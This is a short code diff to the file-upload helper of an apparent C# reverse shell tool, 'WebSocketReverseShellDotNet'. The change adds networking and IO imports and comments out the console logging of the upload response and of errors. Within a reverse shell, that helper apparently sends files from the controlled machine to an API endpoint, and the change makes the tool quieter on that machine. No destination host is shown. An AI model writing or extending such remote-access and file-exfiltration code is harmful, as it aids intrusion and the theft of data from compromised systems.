@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
+using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
 using WebSocketReverseShellDotNet.model;
@@ -16,13 +18,13 @@ namespace WebSocketReverseShellDotNet.utils
             try
             {
                 HttpResponseMessage response = UploadFile(fileToUpload);
-                Console.WriteLine(response);
+                /*Console.WriteLine(response);*/
 
                 return $"File: {fileToUpload.Name} was sent to API endpoint. API output: {response.Content.ReadAsStringAsync().Result}";
             }
             catch (Exception ex)
             {
-                Console.Error.WriteLine($"Failed with error: {ex.Message}");
+                /*Console.Error.WriteLine($"Failed with error: {ex.Message}");*/
                 return $"Failed with error: {ex.Message}";
             }
         }
